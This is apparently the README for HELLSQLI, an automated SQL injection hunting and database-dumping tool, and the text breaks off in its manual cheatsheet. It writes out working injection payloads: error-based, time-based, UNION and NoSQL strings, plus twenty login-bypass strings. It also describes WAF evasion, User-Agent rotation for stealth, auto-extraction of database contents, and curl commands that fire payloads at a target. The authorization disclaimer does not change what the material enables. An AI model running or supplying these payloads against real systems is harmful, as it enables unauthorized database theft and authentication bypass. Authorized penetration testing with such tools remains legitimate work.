<div align="center">

```
██╗  ██╗███████╗██╗     ██╗      ███████╗ ██████╗ ██╗     ██╗
██║  ██║██╔════╝██║     ██║      ██╔════╝██╔═══██╗██║     ██║
███████║█████╗  ██║     ██║      ███████╗██║   ██║██║     ██║
██╔══██║██╔══╝  ██║     ██║      ╚════██║██║▄▄ ██║██║     ██║
██║  ██║███████╗███████╗███████╗ ███████║╚██████╔╝███████╗██║
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝

        v 1 . 0   U L T R A  —  M A D E   I N   H E L L
```

# 💉 HELLSQLI v1.0 ULTRA

### The World's Most Powerful SQL Injection Hunter & Automation Framework

### *"Give it a URL. Walk away. Come back to every SQLi on the target."*

<br>

[![Author](https://img.shields.io/badge/Author-RAJESH%20BAJIYA-ff2d55?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hellrider978)
[![Handle](https://img.shields.io/badge/Handle-HACKEROFHELL-bf5af2?style=for-the-badge&logo=hackaday&logoColor=white)](https://github.com/hellrider978)
[![GitHub](https://img.shields.io/badge/GitHub-hellrider978-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hellrider978/hellsqli)
[![Version](https://img.shields.io/badge/Version-1.0%20ULTRA-00d4ff?style=for-the-badge)](https://github.com/hellrider978/hellsqli)
[![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)](https://kali.org)
[![License](https://img.shields.io/badge/License-MIT-39ff14?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hellrider978/hellsqli?style=for-the-badge&color=ffd60a&label=⭐%20Stars)](https://github.com/hellrider978/hellsqli)

<br>

```
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║   2332 LINES  ·  13 INJECTION MODULES  ·  PURE PYTHON 3                ║
║   ONE COMMAND  →  FULL AUTO CRAWL  →  FIND ALL SQLi  →  REPORT        ║
║                                                                          ║
║   Error-Based · Union-Based · Boolean Blind · Time-Based               ║
║   Header Injection · Cookie SQLi · Login Bypass · NoSQL                ║
║   Second-Order · JSON/API · Path-Based · WAF Bypass (15 methods)       ║
║   Auto Database Dump · MySQL · MSSQL · Oracle · PostgreSQL · SQLite    ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

<br>

> **✍️ Built by RAJESH BAJIYA**
> **🔥 Handle: HACKEROFHELL**
> **🐙 GitHub: [hellrider978](https://github.com/hellrider978)**

</div>

---

## ⚠️ LEGAL DISCLAIMER

```
╔══════════════════════════════════════════════════════════════════════════╗
║                          !! IMPORTANT !!                                 ║
║                                                                          ║
║  HELLSQLI is for AUTHORIZED testing ONLY:                               ║
║    · Systems you personally OWN                                          ║
║    · Systems with EXPLICIT WRITTEN permission to test                    ║
║    · Authorized bug bounty programs (HackerOne/Bugcrowd/etc.)           ║
║                                                                          ║
║  Unauthorized use violates:                                              ║
║    · CFAA (Computer Fraud and Abuse Act) — USA                          ║
║    · Computer Misuse Act — UK                                           ║
║    · IT Act 2000 — India                                                ║
║    · Cybercrime laws in every country                                   ║
║                                                                          ║
║  RAJESH BAJIYA / HACKEROFHELL / hellrider978 takes ZERO liability       ║
║  for misuse, damage, or illegal activity caused by this tool.           ║
╚══════════════════════════════════════════════════════════════════════════╝
```

---

## 📋 TABLE OF CONTENTS

| # | Section |
|---|---------|
| 01 | [What is HELLSQLI?](#-what-is-hellsqli) |
| 02 | [How It Works — One Command](#-how-it-works--one-command) |
| 03 | [Features](#-full-feature-list) |
| 04 | [All 13 Injection Modules](#-all-13-injection-modules) |
| 05 | [Requirements & Installation](#-requirements--installation) |
| 06 | [All CLI Flags & Options](#-all-cli-flags--options) |
| 07 | [Usage — Every Scenario](#-usage--every-scenario) |
| **08** | **[⚡ HOW TO SKIP MODULES](#-how-to-skip-modules)** |
| 09 | [Output Files](#-output-files) |
| 10 | [Reading the HTML Report](#-reading-the-html-report) |
| 11 | [Manual SQL Injection Cheatsheet](#-manual-sql-injection-cheatsheet) |
| 12 | [Troubleshooting](#-troubleshooting) |
| 13 | [Contributing](#-contributing) |
| 14 | [Author](#-author) |

---

## 💉 What is HELLSQLI?

**HELLSQLI** is the world's most complete automated SQL injection hunter. Built in pure Python 3 by **RAJESH BAJIYA (HACKEROFHELL / hellrider978)**.

You give it **one URL or domain**. It automatically:
1. **Crawls** the entire target, discovering every page, form, API endpoint, and parameter
2. **Mines** historical URLs from Wayback Machine and Common Crawl
3. **Extracts** hidden endpoints from JavaScript files
4. **Tests** every single injection point with 13 different techniques
5. **Bypasses** WAFs with 15 encoding techniques
6. **Auto-dumps** database data when injection is confirmed
7. **Generates** a professional HTML report with CVSS scores, copy-paste PoC commands, and remediation

```
You type:    python3 hellsqli.py -t https://target.com

It does:     Module 01 → Crawl all pages, forms, JS, API endpoints, historical URLs
             Module 02 → Detect WAF (15 signatures) + find bypass techniques
             Module 03 → Error-based SQLi (MySQL, MSSQL, Oracle, PostgreSQL, SQLite)
             Module 04 → Boolean Blind SQLi (true/false response diff detection)
             Module 05 → Time-based Blind SQLi (SLEEP/WAITFOR/pg_sleep)
             Module 06 → UNION-based SQLi (auto column detection + data extraction)
             Module 07 → HTTP Header injection (User-Agent, Referer, X-Forwarded-For...)
             Module 08 → Login form bypass (20 bypass payloads, auth detection)
             Module 09 → NoSQL injection (MongoDB $ne/$gt/$regex operators)
             Module 10 → Second-order SQLi (store + trigger pattern)
             Module 11 → Cookie injection (all discovered cookies)
             Module 12 → JSON/API injection (REST endpoints, JSON body)
             Module 13 → HTML report (CVSS, PoC, remediation, risk score)

You get:     HELLSQLI_target.com_20241025_143022.html  ← open in Firefox
```

---

## ⚙️ How It Works — One Command

```bash
python3 hellsqli.py -t https://target.com
```

**No config. No setup. Fully automatic.** The tool handles everything:

- Finds parameters you didn't know existed
- Discovers forms — including hidden fields and API endpoints
- Mines 10,000+ historical URLs from the Wayback Machine
- Extracts endpoints buried inside JavaScript files
- Tests each injection point with 13 techniques in parallel
- Confirms every finding before saving — zero false positives
- Auto-dumps DB version, name, user, and tables when SQLi confirmed

---

## ✨ Full Feature List

```
┌──────────────────────────────────────────────────────────────────────────┐
│                    HELLSQLI v1.0 ULTRA — FEATURES                        │
├──────────────────────────────────────────────────────────────────────────┤
│  INTELLIGENCE                                                             │
│  ✔  Full target crawling with configurable depth                         │
│  ✔  Historical URL mining (Wayback Machine + Common Crawl)              │
│  ✔  Form detection (GET/POST, hidden fields, file uploads)               │
│  ✔  JavaScript endpoint extraction (fetch/axios/url/path patterns)      │
│  ✔  API endpoint discovery (/api/, /rest/, /v1/, /v2/, .json)           │
│  ✔  Path-based parameter detection (/user/123/, /product/456/)          │
│  ✔  Login form identification (auto-detects username+password)          │
│                                                                           │
│  INJECTION TECHNIQUES (13 Modules)                                       │
│  ✔  Error-Based SQLi (MySQL, MSSQL, Oracle, PostgreSQL, SQLite)         │
│  ✔  Boolean Blind SQLi (response length + hash diff detection)          │
│  ✔  Time-Based Blind SQLi (SLEEP/WAITFOR/pg_sleep/DBMS_PIPE)           │
│  ✔  UNION-Based SQLi (auto column count, data extraction, table dump)  │
│  ✔  HTTP Header Injection (8 headers tested)                            │
│  ✔  Login Form Authentication Bypass (20 bypass payloads)              │
│  ✔  NoSQL Injection (MongoDB $ne/$gt/$regex/$where, CouchDB)           │
│  ✔  Second-Order SQLi (store + trigger pattern)                         │
│  ✔  Cookie SQL Injection (all session cookies tested)                  │
│  ✔  JSON/API Body Injection (REST + GraphQL endpoints)                  │
│  ✔  Path-Based Injection (/user/1'/)                                    │
│  ✔  Stacked Query Detection                                             │
│  ✔  HTTP Parameter Pollution                                            │
│                                                                           │
│  DATABASE COVERAGE                                                        │
│  ✔  MySQL / MariaDB                                                      │
│  ✔  Microsoft SQL Server (MSSQL)                                        │
│  ✔  Oracle Database                                                      │
│  ✔  PostgreSQL                                                           │
│  ✔  SQLite                                                               │
│  ✔  MongoDB / NoSQL                                                      │
│                                                                           │
│  WAF BYPASS                                                               │
│  ✔  WAF detection (15 WAF signatures)                                    │
│  ✔  15 bypass encoding techniques                                        │
│  ✔  Comment injection (/**, /*! */, #)                                  │
│  ✔  Case mixing, URL encoding, double URL encoding                      │
│  ✔  Tab/newline/null byte space replacement                             │
│  ✔  MySQL inline comments (/*!50000 SELECT*/)                           │
│  ✔  Unicode normalization bypass                                        │
│                                                                           │
│  EXPLOITATION                                                             │
│  ✔  Auto-dump on confirmed SQLi (--dump flag)                           │
│  ✔  DB version, name, user, hostname, tables extraction                │
│  ✔  20 login bypass payloads for auth testing                          │
│  ✔  UNION output column auto-detection                                  │
│  ✔  Blind data extraction character-by-character                       │
│                                                                           │
│  ADVANCED                                                                 │
│  ✔  Multi-threaded (configurable 1-50 threads)                         │
│  ✔  Burp Suite proxy integration                                        │
│  ✔  Session cookie support                                              │
│  ✔  Bearer token / Basic auth support                                   │
│  ✔  Random User-Agent rotation                                          │
│  ✔  Configurable request delay and rate                                 │
│  ✔  URL file input (test list of URLs at once)                         │
│  ✔  Discord/Slack webhook notifications                                 │
│  ✔  Ctrl+C safe (partial report on interrupt)                          │
│                                                                           │
│  REPORTING                                                                │
│  ✔  Professional dark-theme HTML report                                  │
│  ✔  CVSS score per finding                                               │
│  ✔  One-click copy PoC commands                                          │
│  ✔  Remediation guide per finding                                        │
│  ✔  Risk score calculation                                               │
│  ✔  findings JSON for programmatic use                                   │
│  ✔  Summary text file                                                    │
│  ✔  RAJESH BAJIYA / HACKEROFHELL fingerprint                            │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## 🧩 All 13 Injection Modules

### Module 01 — Target Intelligence & Crawling

The brain. Discovers every injectable point automatically.

```
Discovers:
  ✔  Every page on the target (recursive crawl)
  ✔  All GET parameters (?id=1&page=2&search=test)
  ✔  All POST forms (hidden fields included)
  ✔  Login forms (identified by username/password field names)
  ✔  Historical URLs from Wayback Machine (up to 5000 URLs)
  ✔  Historical URLs from Common Crawl
  ✔  API endpoints from JavaScript analysis
  ✔  Path-based parameters (/product/123/)
  ✔  Endpoints from fetch(), axios(), url: in JS files
```

---

### Module 02 — WAF Detection & Bypass

```
Detects WAFs:
  Cloudflare, ModSecurity, Sucuri, Incapsula, Akamai,
  Imperva, F5 BIG-IP, Barracuda, DenyAll + Generic

15 Bypass Techniques tested:
  URL Double Encoding    · Case Mixing
  Comment Injection      · Plus/Tab/Newline Space
  MySQL Inline Comment   · Hex Encoding
  Null Byte Bypass       · Unicode Spaces
  HTML Encoding          · Base64 Custom
  Scientific Notation    · Backtick Wrap
  Concat Split           · Full URL Encode
  LIKE Operator Swap
```

---

### Module 03 — Error-Based SQL Injection

```
Payloads: 35+ detection payloads
DB-specific: MySQL EXTRACTVALUE, MSSQL CONVERT, Oracle UTL_HTTP, PostgreSQL CAST
Detects errors from: MySQL, MSSQL, Oracle, PostgreSQL, SQLite, Generic
Evidence: Extracts the actual error message from response
WAF bypass: Automatically tries 5 encoding variants if WAF detected
```

**What triggers error-based:**
```
'     ''     `     "     \     '--     '#
' OR '1'='1     1' AND SLEEP(0)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
```

---

### Module 04 — Boolean Blind SQL Injection

```
Method: Compares response length + MD5 hash for TRUE vs FALSE conditions
TRUE payloads:   ' AND '1'='1   ' AND 1=1--   ' AND 'a'='a'--
FALSE payloads:  ' AND '1'='2   ' AND 1=2--   ' AND 'a'='b'--
Confirmation:    TRUE must match baseline, FALSE must differ by >20 bytes
Thread-safe:     Runs all GET params in parallel
```

---

### Module 05 — Time-Based Blind SQL Injection

```
Sleep time:  5 seconds (configurable via threshold)
Baseline:    Measures normal response time first
Threshold:   elapsed >= baseline + 4.0s = confirmed

Payloads per DB:
  MySQL:      ' AND SLEEP(5)--  ·  ' AND SLEEP(5)#  ·  ') AND SLEEP(5)--
  MSSQL:      '; WAITFOR DELAY '0:0:5'--  ·  ' WAITFOR DELAY '0:0:5'--
  PostgreSQL: '; SELECT pg_sleep(5)--  ·  ' AND 1=(SELECT 1 FROM pg_sleep(5))--
  Oracle:     ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--
  SQLite:     ' AND 1=(SELECT 1 FROM sqlite_master WHERE 1=RANDOMBLOB(500000000/2))--
```

---

### Module 06 — UNION-Based SQL Injection

```
Method: Auto-detects column count (1-10), finds output column via marker
Marker:  Random string injection to confirm output reflection
Extracts on confirm:
  · DB version  (version())
  · DB name     (database())
  · DB user     (user())
  · All tables  (group_concat from information_schema)

Auto-dump (--dump flag):
  · All database names
  · All table names in current DB
  · Column names from interesting tables
```

---

### Module 07 — HTTP Header Injection

```
Headers tested:
  User-Agent        X-Forwarded-For     X-Real-IP
  Referer           X-Forwarded-Host    Accept-Language
  X-Custom-Header   Cookie (separately)

Techniques per header:
  · Error-based detection
  · Time-based blind (5s sleep)
  · Boolean blind
```

---

### Module 08 — Login Form Authentication Bypass

```
Identifies login forms by field names:
  username, user, email, login, name (user fields)
  password, passwd, pass, pwd, secret (password fields)

20 bypass payloads:
  admin'--          admin'#           ' OR '1'='1'--
  ' OR 1=1--        ') OR ('1'='1     admin'/*
  " OR "1"="1       ' OR 2>1--        ' UNION SELECT 1,'admin','admin'--
  admin' OR '1'='1  ' OR 'x'='x      admin';--
  + 8 more combinations

Success detection:
  · Redirect to: dashboard/admin/home/panel/account
  · Response contains: logout/welcome/profile/dashboard
  · Response larger than failed login baseline
```

---

### Module 09 — NoSQL Injection

```
Targets: MongoDB, CouchDB, Firebase
URL-based operators:
  [$ne]=1   [$gt]=0   [$regex]=.*   [$exists]=true   [$nin][]=x

JSON body operators:
  {"$gt": ""}      {"$ne": "null"}    {"$regex": ".*"}
  {"$exists": true}  {"$where": "this.password.length > 0"}

Detection: Response size comparison vs baseline
```

---

### Module 10 — Second-Order SQL Injection

```
Method:
  Step 1: Store malicious payload in registration/profile forms
  Step 2: Access profile/account/settings/dashboard pages
  Step 3: If DB error appears on trigger page = second-order confirmed

Trigger paths tested:
  /profile  /account  /settings  /user  /dashboard
  /my-account  /edit-profile  /update
```

---

### Module 11 — Cookie SQL Injection

```
Tests: All cookies set by the application
Techniques: Error-based + time-based per cookie
Common vulnerable cookies: session, auth, user_id, remember_me,
                            PHPSESSID, user, token, id, data
```

---

### Module 12 — JSON/API Injection

```
Endpoints tested: All discovered API paths
Methods: GET (query params) + POST (JSON body)
Fields tested in JSON body:
  id, userId, username, email, query, search, filter, name

Techniques:
  · Error-based detection in JSON response
  · Time-based blind on API endpoints
```

---

## 📦 Requirements & Installation

### Requirements

```
Python 3.8+
pip packages: requests, beautifulsoup4 (optional but recommended)
OS: Any (Kali Linux recommended for bug bounty work)
```

### Install in 60 seconds

```bash
# Clone
git clone https://github.com/hellrider978/hellsqli.git
cd hellsqli

# Install dependencies
pip3 install requests beautifulsoup4 --break-system-packages

# Make executable
chmod +x hellsqli.py

# Test
python3 hellsqli.py -t https://testphp.vulnweb.com
```

### Manual install without git

```bash
# Create folder
mkdir ~/hellsqli
cd ~/hellsqli

# Copy hellsqli.py into this folder (nano paste method)
nano hellsqli.py
# → Paste code → Ctrl+X → Y → Enter

# Install deps
pip3 install requests beautifulsoup4 --break-system-packages

# Run
python3 ~/hellsqli/hellsqli.py -t https://target.com
```

### Verify Install

```bash
python3 hellsqli.py --help
# Should show HELLSQLI banner and all flags
```

---

## 🎛️ All CLI Flags & Options

```
╔══════════════════════════════════════════════════════════════════════╗
║              HELLSQLI v1.0 ULTRA — ALL FLAGS                         ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  TARGET (required):                                                  ║
║    -t, --target    https://target.com  URL, domain, or IP           ║
║    -u, --url       Specific URL with params to test                  ║
║    -f, --url-file  File with list of URLs (one per line)            ║
║                                                                      ║
║  OUTPUT:                                                             ║
║    -o, --output    ~/hellsqli_output    Output directory             ║
║                                                                      ║
║  AUTHENTICATION:                                                     ║
║    --cookie   "PHPSESSID=abc;token=xyz"   Session cookies           ║
║    --headers  "Authorization: Bearer TOKEN"   Custom headers        ║
║    --auth     "admin:password"              Basic auth              ║
║    --token    "YOUR_JWT_TOKEN"              Bearer token            ║
║                                                                      ║
║  PROXY:                                                              ║
║    -p, --proxy    http://127.0.0.1:8080    Route through Burp       ║
║                                                                      ║
║  SCAN DEPTH:                                                         ║
║    --crawl        Enable deep crawling (default: smart crawl)       ║
║    --deep         Max depth crawl + all techniques                  ║
║    --ultra        MAXIMUM POWER: crawl+deep+dump+waf-bypass+level3 ║
║    --dump         Auto-dump DB data when SQLi confirmed             ║
║    --level   1|2|3   Test depth  1=fast  2=normal  3=thorough      ║
║    --api-mode     Focus testing on API/JSON endpoints               ║
║    --forms        Test all forms (default: on)                      ║
║    --no-forms     Skip all form testing                             ║
║                                                                      ║
║  SPEED:                                                              ║
║    --threads  10    Parallel thread count (default: 10)             ║
║    --timeout  15    Request timeout seconds (default: 15)           ║
║    --delay    0     Seconds between requests (default: 0)           ║
║    --rate     100   Max requests per second (default: 100)          ║
║    --retries  2     Retry count on failure (default: 2)             ║
║                                                                      ║
║  BYPASS:                                                             ║
║    --waf-bypass    Enable all WAF bypass encoding techniques        ║
║    --random-agent  Rotate User-Agent per request                    ║
║    --user-agent "Custom UA"   Set specific User-Agent               ║
║                                                                      ║
║  SKIP FLAGS (see Section 08):                                       ║
║    --skip-crawl    Don't crawl — only test given URL/file          ║
║    --skip-error    Skip Module 03 (error-based)                    ║
║    --skip-blind    Skip Module 04 (boolean blind)                  ║
║    --skip-time     Skip Module 05 (time-based)                     ║
║    --skip-union    Skip Module 06 (union-based)                    ║
║    --skip-headers  Skip Module 07 (header injection)               ║
║    --skip-nosql    Skip Module 09 (NoSQL injection)                ║
║    --skip-modules  1,2,7   Skip any module by number               ║
║                                                                      ║
║  NOTIFICATIONS:                                                      ║
║    --webhook   https://hooks.slack.com/...    Slack/Discord alert  ║
║                                                                      ║
║  MISC:                                                               ║
║    --silent        Suppress non-finding output                      ║
║    --no-color      Disable ANSI colors                              ║
║    --verify-ssl    Enable SSL certificate verification              ║
║    -h, --help      Show help                                         ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## 💻 Usage — Every Scenario

### ── The One Command You Need ──

```bash
python3 hellsqli.py -t https://target.com
```

> **That's it. Auto-crawl, test all 13 modules, generate report.**

---

### Standard Scans

```bash
# Basic — auto everything
python3 hellsqli.py -t https://target.com

# Domain only (auto-adds https://)
python3 hellsqli.py -t target.com

# IP address
python3 hellsqli.py -t 192.168.1.100

# Specific URL with known parameter
python3 hellsqli.py -t https://target.com -u "https://target.com/page?id=1"

# List of URLs from file
python3 hellsqli.py -t https://target.com -f urls.txt

# Deep crawl + all techniques
python3 hellsqli.py -t https://target.com --crawl --deep

# Maximum power (ultra mode)
python3 hellsqli.py -t https://target.com --ultra
```

---

### With Authentication

```bash
# Session cookie (copy from browser DevTools)
python3 hellsqli.py -t https://target.com \
  --cookie "PHPSESSID=abc123xyz;session_token=def456"

# JWT Bearer token
python3 hellsqli.py -t https://target.com \
  --token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Custom Authorization header
python3 hellsqli.py -t https://target.com \
  --headers "Authorization: Bearer YOUR_TOKEN"

# HTTP Basic auth
python3 hellsqli.py -t https://target.com \
  --auth "admin:password123"

# Multiple custom headers
python3 hellsqli.py -t https://target.com \
  --headers "Authorization: Bearer TOKEN" \
  --cookie "session=abc123"
```

---

### Proxy Integration (Burp Suite)

```bash
# Route all traffic through Burp Suite
python3 hellsqli.py -t https://target.com \
  -p http://127.0.0.1:8080

# Burp + deep scan
python3 hellsqli.py -t https://target.com \
  -p http://127.0.0.1:8080 --ultra
```

---

### Speed Control

```bash
# Fast scan — no crawl, skip slow modules
python3 hellsqli.py -t https://target.com/page?id=1 \
  --skip-crawl --skip-time --skip-blind

# Stealth — slow rate, long delays
python3 hellsqli.py -t https://target.com \
  --delay 2 --rate 10 --threads 3

# Aggressive — max threads
python3 hellsqli.py -t https://target.com \
  --threads 30 --rate 500

# Level control
python3 hellsqli.py -t https://target.com --level 1  # fast, fewer payloads
python3 hellsqli.py -t https://target.com --level 3  # deep, all payloads
```

---

### WAF Bypass Mode

```bash
# Auto-detect WAF and test bypass techniques
python3 hellsqli.py -t https://target.com --waf-bypass

# Rotate User-Agent to avoid detection
python3 hellsqli.py -t https://target.com --random-agent

# Full stealth with bypass
python3 hellsqli.py -t https://target.com \
  --waf-bypass --random-agent --delay 1 --rate 20
```

---

### With Auto Dump

```bash
# Auto-extract DB version, name, user, tables when SQLi found
python3 hellsqli.py -t https://target.com --dump

# Ultra + dump = maximum extraction
python3 hellsqli.py -t https://target.com --ultra --dump
```

---

### API / JSON Testing

```bash
# Focus on API endpoints
python3 hellsqli.py -t https://target.com --api-mode

# Test specific API with auth
python3 hellsqli.py -t https://target.com/api/v1 \
  --token "YOUR_JWT" --api-mode

# API with crawl
python3 hellsqli.py -t https://target.com \
  --api-mode --crawl
```

---

### Notifications

```bash
# Slack webhook — alerts on every critical finding
python3 hellsqli.py -t https://target.com \
  --webhook "https://hooks.slack.com/services/T000/B000/xxxx"

# Discord webhook
python3 hellsqli.py -t https://target.com \
  --webhook "https://discord.com/api/webhooks/YOUR_ID/TOKEN"
```

---

### Custom Output Directory

```bash
python3 hellsqli.py -t https://target.com \
  -o ~/bug_bounty/target_company/sqli_scan
```

---

### Full Power Scan

```bash
# The most powerful scan possible
python3 hellsqli.py \
  -t https://target.com \
  -o ~/pentests/target \
  --ultra \
  --dump \
  --waf-bypass \
  --random-agent \
  --threads 20 \
  --level 3 \
  -p http://127.0.0.1:8080 \
  --webhook "https://hooks.slack.com/YOUR/WEBHOOK" \
  --cookie "session=YOUR_SESSION_COOKIE"
```

---

## ⚡ HOW TO SKIP MODULES

> **Full guide on controlling which modules run. Skip what you don't need, keep what you do.**

---

### Method 1 — Built-in Skip Flags (Easiest — No Editing)

These flags are built in — just add them to your command:

```bash
# Skip the crawling phase (only test the exact URL you give)
python3 hellsqli.py -t https://target.com/page?id=1 --skip-crawl

# Skip error-based module (Module 03)
python3 hellsqli.py -t https://target.com --skip-error

# Skip boolean blind (Module 04) — slowest for large param lists
python3 hellsqli.py -t https://target.com --skip-blind

# Skip time-based (Module 05) — very slow (5s per payload)
python3 hellsqli.py -t https://target.com --skip-time

# Skip UNION-based (Module 06)
python3 hellsqli.py -t https://target.com --skip-union

# Skip header injection (Module 07)
python3 hellsqli.py -t https://target.com --skip-headers

# Skip NoSQL injection (Module 09)
python3 hellsqli.py -t https://target.com --skip-nosql
```

---

### Method 2 — Skip Any Module by Number

Use `--skip-modules` with comma-separated module numbers:

```bash
# Skip Module 1 (crawling) and Module 5 (time-based)
python3 hellsqli.py -t https://target.com --skip-modules 1,5

# Skip Module 7 (header injection) and Module 9 (NoSQL)
python3 hellsqli.py -t https://target.com --skip-modules 7,9

# Keep ONLY error-based + login bypass + report (skip everything else)
python3 hellsqli.py -t https://target.com --skip-modules 2,4,5,6,7,9,10,11,12

# Skip all slow modules for a fast first-pass
python3 hellsqli.py -t https://target.com --skip-modules 4,5,10,11

# Skip NoSQL and second-order (only relevant for MongoDB targets)
python3 hellsqli.py -t https://target.com --skip-modules 9,10
```

---

### Module Number Reference Table

| Module # | Name | When to SKIP it |
|----------|------|----------------|
| 1 | Target Intelligence & Crawling | You already have a URL list → use `-f urls.txt --skip-modules 1` |
| 2 | WAF Detection & Bypass | No WAF on target, want faster scan |
| 3 | Error-Based SQLi | Target sanitizes errors (no DB errors shown) |
| 4 | Boolean Blind SQLi | Slow on large param lists, skip for fast first pass |
| 5 | Time-Based Blind SQLi | Very slow (5s per payload), skip for quick checks |
| 6 | UNION-Based SQLi | Skip if you only need detection, not data extraction |
| 7 | HTTP Header Injection | Skip if testing endpoints where headers aren't logged to DB |
| 8 | Login Bypass | Skip if no login forms on target |
| 9 | NoSQL Injection | Skip if target uses SQL only (no MongoDB) |
| 10 | Second-Order SQLi | Skip for quick scans (requires crawl + revisit) |
| 11 | Cookie Injection | Skip if no interesting cookies set by app |
| 12 | JSON/API Injection | Skip if target has no API endpoints |
| 13 | Report Generation | **NEVER SKIP** — this generates your output |

---

### Common Skip Scenarios

```bash
# === SCENARIO: Quick first-pass, just check if SQLi exists ===
python3 hellsqli.py -t https://target.com --skip-modules 4,5,10,11

# === SCENARIO: I have my own URL list, skip crawling ===
python3 hellsqli.py -t https://target.com -f my_urls.txt --skip-crawl

# === SCENARIO: Only test login forms for bypass ===
python3 hellsqli.py -t https://target.com \
  --skip-crawl --skip-modules 2,3,4,5,6,7,9,10,11,12

# === SCENARIO: Only check GET parameters, skip headers/cookies ===
python3 hellsqli.py -t https://target.com \
  --skip-headers --skip-modules 9,10,11,12

# === SCENARIO: Time-based only (target sanitizes errors perfectly) ===
python3 hellsqli.py -t https://target.com \
  --skip-modules 3,4,6,7,8,9,10,11,12

# === SCENARIO: API-focused scan, skip web form stuff ===
python3 hellsqli.py -t https://target.com \
  --api-mode --skip-modules 8,9,10,11

# === SCENARIO: Passive — only WAF check + crawl, no injection ===
python3 hellsqli.py -t https://target.com \
  --skip-modules 3,4,5,6,7,8,9,10,11,12

# === SCENARIO: Super fast scan — error-based only ===
python3 hellsqli.py -t https://target.com \
  --skip-crawl --skip-modules 2,4,5,6,7,8,9,10,11,12

# === SCENARIO: Target is MongoDB, focus NoSQL only ===
python3 hellsqli.py -t https://target.com \
  --skip-error --skip-blind --skip-time --skip-union --skip-headers
```

---

### Speed Comparison by Module Combination

| Mode | Modules Running | Speed | Best For |
|------|----------------|-------|---------|
| **Ultra** | All 13 | 🐢 Slowest | Full comprehensive audit |
| **Standard** | 1,2,3,6,8,12,13 | 🐇 Fast | Quick bug bounty check |
| **Error-only** | 1,3,13 | ⚡ Fastest | Initial validation |
| **Deep blind** | 1,4,5,13 | 🐢 Slow | Hardened targets (no errors shown) |
| **Auth focus** | 1,8,13 | ⚡ Fast | Login page testing |
| **API focus** | 1,2,6,12,13 | 🐇 Fast | API/REST endpoint testing |

---

## 📁 Output Files

```
~/hellsqli_output/
└── target.com/
    │
    ├── HELLSQLI_target.com_20241025_143022.html   ← OPEN THIS (main report)
    │
    ├── hellsqli_findings.json                     ← Machine-readable findings
    │   {
    │     "target": "https://target.com",
    │     "author": "RAJESH BAJIYA",
    │     "handle": "HACKEROFHELL",
    │     "tool": "HELLSQLI v1.0 ULTRA",
    │     "findings": [...]
    │   }
    │
    ├── summary.txt                                ← Quick text summary
    │   HELLSQLI v1.0 ULTRA — by RAJESH BAJIYA
    │   Total: 3 findings
    │   CRITICAL: 2 | HIGH: 1
    │   [CRITICAL] SQL Injection (Error-Based) — MySQL
    │     URL: https://target.com/page?id=1
    │     Param: id
    │
    ├── discovered_targets.txt                     ← All URLs with params found
    │
    ├── waf_bypasses.txt                           ← Working WAF bypass techniques
    │   (if WAF detected)
    │
    └── dump_id.txt                                ← Auto-dumped DB data
        (if --dump used and SQLi confirmed)
        version: 8.0.32-MySQL
        database: target_db
        user: admin@localhost
        databases: target_db,mysql,sys
```

---

## 📊 Reading the HTML Report

```bash
# Open the report
firefox ~/hellsqli_output/target.com/HELLSQLI_target.com_*.html

# Auto-find and open
find ~/hellsqli_output -name "HELLSQLI_*.html" 2>/dev/null | xargs firefox
```

**Report layout:**

```
┌──────────────────────────────────────────────────────────────────────┐
│  HELLSQLI ASCII ART BANNER                                           │
│  SQL INJECTION AUDIT REPORT                                          │
│  Target · Date · Author: RAJESH BAJIYA · HACKEROFHELL               │
│                                                    Risk Score: 79   │
├────────────────────────┬──────────────────┬──────────────────────────┤
│ Severity Chart         │ Statistics       │ Injection Types          │
│ CRITICAL ████          │ Total:    3       │ error-based             │
│ HIGH     ██            │ Critical: 2       │ union-based             │
│ MEDIUM   █             │ High:     1       │ login-bypass            │
│                        │ Requests: 1247   │                         │
├────────────────────────┴──────────────────┴──────────────────────────┤
│ 💉 CONFIRMED SQL INJECTION FINDINGS                                   │
│                                                                      │
│ ┌─────────────────────────────────────────────────────────────────┐  │
│ │ [CRITICAL] CVSS 9.8  Error-Based (MySQL)   error-based  ▼      │  │
│ │  URL:       https://target.com/page?id=1                        │  │
│ │  Parameter: id                                                   │  │
│ │  Method:    GET                                                  │  │
│ │  Payload:   ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())) │  │
│ │  Evidence:  XPATH syntax error: '~8.0.32-MySQL'                 │  │
│ │  PoC:       sqlmap -u '...' --dbs  [⎘ COPY]                    │  │
│ │  Fix:       Use parameterized queries                           │  │
│ └─────────────────────────────────────────────────────────────────┘  │
│ ... (click any finding to expand)                                   │
├──────────────────────────────────────────────────────────────────────┤
│ RAJESH BAJIYA  |  HACKEROFHELL  |  hellrider978  |  CONFIDENTIAL    │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 📖 Manual SQL Injection Cheatsheet

Quick reference for manual testing and follow-up exploitation.

### Detection

```bash
# Single quote test
curl -sk "https://target.com/page?id=1'"
curl -sk "https://target.com/page?id=1'--"
curl -sk "https://target.com/page?id=1' OR '1'='1"

# Check for errors in response
curl -sk "https://target.com/page?id=1'" | grep -iE "sql|syntax|error|warning|mysql|ora-"

# Boolean test
curl -sk "https://target.com/page?id=1 AND 1=1"  # should work
curl -sk "https://target.com/page?id=1 AND 1=2"  # should return empty/different
```

### Error-Based Extraction (MySQL)

```bash
# Extract DB version
curl -sk "https://target.com/page?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--"

